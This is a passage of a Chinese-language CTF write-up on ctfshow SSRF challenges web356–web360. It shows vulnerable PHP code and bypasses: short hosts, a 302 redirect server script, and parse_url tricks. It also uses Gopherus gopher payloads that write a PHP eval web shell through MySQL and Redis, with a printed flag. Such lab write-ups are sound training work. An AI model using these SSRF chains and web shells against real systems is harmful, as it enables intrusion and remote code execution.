srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web356-é•¿åº¦é™åˆ¶"><a href="#web356-é•¿åº¦é™åˆ¶" class="headerlink" title="web356 é•¿åº¦é™åˆ¶"></a>web356 é•¿åº¦é™åˆ¶</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen(<span class="variable">$host</span>)&lt;=<span class="number">3</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åŒ web255ï¼Œåªä¸è¿‡çŸ­äº†ç‚¹</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619320437184-bc295661-c42b-42f6-89e0-eb1d3c1e6497.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619320437184-bc295661-c42b-42f6-89e0-eb1d3c1e6497.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web357-IPè¿‡æ»¤å™¨"><a href="#web357-IPè¿‡æ»¤å™¨" class="headerlink" title="web357 IPè¿‡æ»¤å™¨"></a>web357 IPè¿‡æ»¤å™¨</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = gethostbyname(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å…ˆè·å–ä¸»æœºåå¯¹åº”çš„ipï¼Œç„¶åç”¨IPè¿‡æ»¤å™¨è¿›è¡Œè¿‡æ»¤</p><ul><li>FILTER_FLAG_NO_PRIV_RANGE - è¦æ±‚å€¼æ˜¯ RFC æŒ‡å®šçš„ç§åŸŸ IP ï¼ˆæ¯”å¦‚ 192.168.0.1ï¼‰</li><li>FILTER_FLAG_NO_RES_RANGE - è¦æ±‚å€¼ä¸åœ¨ä¿ç•™çš„ IP èŒƒå›´å†…ã€‚è¯¥æ ‡å¿—æ¥å— IPV4 å’Œ IPV6 å€¼ã€‚</li></ul><p>å³ï¼Œä¸»æœºåè§£æçš„ IP ä¸èƒ½æ˜¯ä¿ç•™åœ°å€æˆ–è€…æ˜¯å†…ç½‘ IPã€‚</p><p>è¿™æ—¶åˆ©ç”¨å…¬ç½‘æœåŠ¡å™¨è¿›è¡Œé‡å®šå‘å³å¯ï¼Œä¸ºäº†ä»¥åçš„é¢˜ç›® fuzz æ–¹ä¾¿ï¼Œå†™å¥½å‚æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$h_p_p</span> = explode(<span class="string">&quot;@&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$h_p_p</span>[<span class="number">0</span>] <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="variable">$h_p_p</span>[<span class="number">1</span>] <span class="keyword">or</span> <span class="string">&#x27;80&#x27;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$h_p_p</span>[<span class="number">2</span>] <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">header(<span class="string">&quot;Location: http://<span class="subst">$host</span>:<span class="subst">$port</span>/<span class="subst">$path</span>&quot;</span>, <span class="literal">TRUE</span>, <span class="number">302</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619322657727-06fce0c5-989d-4a94-8183-42084399e9da.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619322657727-06fce0c5-989d-4a94-8183-42084399e9da.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web358-ç™½åå•æ­£åˆ™"><a href="#web358-ç™½åå•æ­£åˆ™" class="headerlink" title="web358 ç™½åå•æ­£åˆ™"></a>web358 ç™½åå•æ­£åˆ™</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼Œ</p><p>ä¹‹å‰ä¸€ç›´æ²¡åˆ†æåˆ°è¿™ä¸ª <code>parse_url</code> å‡½æ•°çš„ç‰¹æ€§ï¼Œæœ‰äº›æ—¶å€™æœ‰çš„æ—¶å€™ URL ä¼šé•¿è¿™æ ·</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323550261-1856f9f8-fcfa-4beb-b3cc-d108282f319f.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323550261-1856f9f8-fcfa-4beb-b3cc-d108282f319f.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>è§£ææ—¶ï¼Œä¼šæŠŠ@è¿›è¡Œåˆ†å‰²ï¼Œå‰é¢æ˜¯ç”¨æˆ·ï¼Œåé¢æ˜¯ä¸»æœºåã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323676559-da7b2c5e-97d3-4169-b4ca-901b68a1e749.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619323676559-da7b2c5e-97d3-4169-b4ca-901b68a1e749.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web359-æ‰“æ— å¯†ç MySQL"><a href="#web359-æ‰“æ— å¯†ç MySQL" class="headerlink" title="web359 æ‰“æ— å¯†ç MySQL"></a>web359 æ‰“æ— å¯†ç MySQL</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><p>é¢˜ç›®æç¤º</p><blockquote><p>æ‰“æ— å¯†ç çš„mysql</p><p>ä¸ºä»€ä¹ˆæ˜¯æ— å¯†ç å‘¢ï¼Ÿ</p><p><a href="https://paper.seebug.org/510/">https://paper.seebug.org/510/</a></p><p>MySQLå®¢æˆ·ç«¯è¿æ¥å¹¶ç™»å½•æœåŠ¡å™¨æ—¶å­˜åœ¨ä¸¤ç§æƒ…å†µï¼šéœ€è¦å¯†ç è®¤è¯ä»¥åŠæ— éœ€å¯†ç è®¤è¯ã€‚å½“éœ€è¦å¯†ç è®¤è¯æ—¶ä½¿ç”¨æŒ‘æˆ˜åº”ç­”æ¨¡å¼ï¼ŒæœåŠ¡å™¨å…ˆå‘é€saltç„¶åå®¢æˆ·ç«¯ä½¿ç”¨saltåŠ å¯†å¯†ç ç„¶åéªŒè¯ï¼›å½“æ— éœ€å¯†ç è®¤è¯æ—¶ç›´æ¥å‘é€TCP/IPæ•°æ®åŒ…å³å¯ã€‚æ‰€ä»¥åœ¨éäº¤äº’æ¨¡å¼ä¸‹ç™»å½•å¹¶æ“ä½œMySQLåªèƒ½åœ¨æ— éœ€å¯†ç è®¤è¯ï¼Œæœªæˆæƒæƒ…å†µä¸‹è¿›è¡Œï¼Œæœ¬æ–‡åˆ©ç”¨SSRFæ¼æ´æ”»å‡»MySQLä¹Ÿæ˜¯åœ¨å…¶æœªæˆæƒæƒ…å†µä¸‹è¿›è¡Œçš„ã€‚</p></blockquote><p>éšä¾¿å†™ç‚¹ä¸œè¥¿ Login ä¸€ä¸‹ï¼Œç„¶åæœ‰ä¸ª <code>returl</code> å†™ä¸ª baiduï¼Œå‘ç°å¯ä»¥è¯·æ±‚ baidu</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619324137797-1e83cc1d-d7c6-4a7f-8d3f-bdd7ee83def4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619324137797-1e83cc1d-d7c6-4a7f-8d3f-bdd7ee83def4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ä¸€èˆ¬ SSRF æ‰“å†…ç½‘åº”ç”¨ä¸»è¦è¿˜æ˜¯é€šè¿‡åè®®ï¼Œæ¯”å¦‚ç”¨çš„æ¯”è¾ƒå¤šçš„æ˜¯ gopher</p><p>å…·ä½“æ€ä¹ˆåšå‘¢ï¼Ÿ</p><p>ç»†å¿ƒçš„åŒå­¦å¯èƒ½å‘ç°ï¼Œæ— è®ºæ˜¯ç”¨ gopher æ”»å‡» redisã€mysqlã€è¿˜æ˜¯ ftpï¼Œè¿™äº›ä¸»è¦éƒ½æ˜¯åŸºäº tcp åè®®ä¸ºä¸»ã€‚è¿™å’Œ gopher åè®®çš„åŸºæœ¬æ ¼å¼æœ‰å…³</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_åæ¥TCPæ•°æ®æµ</span><br></pre></td></tr></table></figure><p>å› ä¸ºï¼Œå¦‚æœæƒ³è¦æ‰“ MySQL å°±éœ€è¦çŸ¥é“ MySQL é€šä¿¡æ—¶çš„ TCP æ•°æ®æµï¼Œæ‰èƒ½çŸ¥é“è¦æ€ä¹ˆå’Œ MySQL é€šä¿¡ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡ Wireshark æŠ“åŒ…æ¥åˆ†æ</p><p>å¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥çš„ 0x02 mysqlåè®®åˆ†æéƒ¨åˆ†</p><p><a href="https://www.freebuf.com/articles/web/159342.html">https://www.freebuf.com/articles/web/159342.html</a></p><p>ä¸è¿‡è¿™é‡Œæœ‰ä¸ªæ›´å¥½ç”¨çš„å·¥å…·</p><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>ä»–åŒ…å«å¸¸è§çš„åº”ç”¨ gopher æ•°æ®åŒ…çš„æ ¼å¼æ„é€ ï¼Œ åŸç†ä¹Ÿæ˜¯é€šè¿‡ Wireshark æŠ“åŒ…åˆ†æï¼Œç„¶åå†™è„šæœ¬ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p>ä¾æ¬¡è¾“å…¥ç”¨æˆ·å’Œè¦æ‰§è¡Œçš„SQLè¯­å¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give MySQL username: root</span><br><span class="line">Give query to execute: select <span class="string">&#x27;&lt;?php eval($_GET[c]);?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/c.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335107292-3c92991d-dada-496f-8b43-14be5a4e8eef.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335107292-3c92991d-dada-496f-8b43-14be5a4e8eef.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å½“ç„¶ï¼Œé™¤äº†æ»¡è¶³MySQLæœªæˆæƒå¤–ï¼Œè¿˜éœ€è¦MySQLå¼€å¯å…è®¸å¯¼å‡ºæ–‡ä»¶ä»¥åŠçŸ¥é“ç½‘ç«™æ ¹ç›®å½•ï¼Œæœ¬æ¼æ´æ‰èƒ½æˆåŠŸåˆ©ç”¨ï¼Œç¼ºä¸€ä¸å¯ã€‚</p><p>è¿™ä¸ª <code>/var/www/html</code> ç›®å½•æ˜¯å¦‚ä½•çŸ¥é“çš„å‘¢ï¼Ÿåº”è¯¥æ˜¯çˆ†ç ´çš„â€¦</p><p>ç”Ÿæˆçš„ POC é‡Œï¼Œ<code>_</code> å­—ç¬¦åé¢çš„å†…å®¹è¿˜è¦ URLç¼–ç ä¸€æ¬¡ï¼Œå› ä¸º PHPæ¥æ”¶åˆ°POSTæˆ–GETè¯·æ±‚æ•°æ®ï¼Œä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡URLè§£ç ï¼Œç„¶åï¼Œæ¯”å¦‚ %00 è§£ç åï¼ŒPHPä¼šç›´æ¥æˆªæ–­ã€‚ã€‚</p><p>æœ€ç»ˆ POC</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335618842-0ce07752-0b70-41d0-8a06-53666b73008b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335618842-0ce07752-0b70-41d0-8a06-53666b73008b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ç„¶ååœ¨ c.php é‡Œé¢ <code>cat /flag.txt</code> å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335868031-a7034018-b9ca-4614-9841-adbf4dae281b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619335868031-a7034018-b9ca-4614-9841-adbf4dae281b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>flag</p><p>ctfshow{d9cfb450-02d7-4b13-9170-4b9306d01a34}</p><p>é¡ºä¾¿å«–ä¸€ä¸‹ check.php ä»£ç  ï¼ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;returl&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;returl&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/file|dict/i&quot;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">echo</span> _request(<span class="string">&quot;<span class="subst">$url</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_request</span>(<span class="params"><span class="variable">$curl</span>,<span class="variable">$https</span>=<span class="literal">true</span>,<span class="variable">$method</span>=<span class="string">&#x27;get&#x27;</span>,<span class="variable">$data</span>=<span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(); <span class="comment">//åˆå§‹åŒ–</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$curl</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="literal">true</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);<span class="comment">//è®¾ç½®ä¸éœ€è¦å¤´ä¿¡æ¯</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);<span class="comment">//è·å–é¡µé¢å†…å®¹ï¼Œä½†ä¸è¾“å‡º</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$https</span>)</span><br><span class="line">&#123;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSL_VERIFYPEER,<span class="literal">FALSE</span>);<span class="comment">//ä¸åšæœåŠ¡å™¨è®¤è¯</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>,CURLOPT_SSL_VERIFYHOST,<span class="literal">FALSE</span>);<span class="comment">//ä¸åšå®¢æˆ·ç«¯è®¤è¯</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$method</span>==<span class="string">&#x27;post&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POST,<span class="literal">true</span>);<span class="comment">//è®¾ç½®è¯·æ±‚æ˜¯postæ–¹å¼</span></span><br><span class="line">    curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);<span class="comment">//è®¾ç½®postè¯·æ±‚æ•°æ®</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span>=curl_exec(<span class="variable">$ch</span>);<span class="comment">//æ‰§è¡Œè®¿é—®</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>);<span class="comment">//å…³é—­curlï¼Œé‡Šæ”¾èµ„æº</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$str</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/articles/web/260806.html">https://www.freebuf.com/articles/web/260806.html</a></p><p>å½“ç„¶è¿˜å¯ä»¥æœ‰å…¶ä»–åˆ©ç”¨æ–¹å¼ï¼Œæ¯”å¦‚æ„é€  POST è¯·æ±‚è¿›è¡Œ SQLæ³¨å…¥ï¼Œæ–‡ä»¶ä¸Šä¼ ç­‰</p><h2 id="web360-æ‰“Redis"><a href="#web360-æ‰“Redis" class="headerlink" title="web360 æ‰“Redis"></a>web360 æ‰“Redis</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><p>é¢˜ç›®æç¤º</p><blockquote><p>æ‰“redis</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œä¹Ÿæ˜¯ç”¨ Gopherus æ‰“ redis</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">What <span class="keyword">do</span> you want?? (ReverseShell/PHPShell): PHPShell</span><br><span class="line"></span><br><span class="line">Give web root location of server (default is /var/www/html):</span><br><span class="line">Give PHP Payload (We have default PHP Shell): <span class="string">&#x27;&lt;?php 